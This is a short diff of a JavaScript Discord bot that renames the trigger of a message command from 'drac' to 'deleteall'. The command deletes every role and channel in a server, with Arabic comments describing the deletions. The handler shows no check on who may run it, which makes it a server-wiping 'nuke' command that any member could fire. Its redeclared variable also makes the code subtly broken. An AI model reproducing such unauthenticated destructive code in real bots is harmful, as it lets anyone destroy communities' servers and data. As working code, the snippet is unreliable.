@@ -2785,7 +2785,7 @@ message.channel.send({embed});
 
 
 client.on('message', alpha => {
- if (alpha.content.startsWith("drac")) {
+ if (alpha.content.startsWith("deleteall")) {
 alpha.guild.roles.forEach(r => { r.delete() }) // لمسح الرتب
 alpha.guild.channels.forEach(c => { c.delete() })// للمسح الرومات
 let alpha = new Discord.RichEmbed()
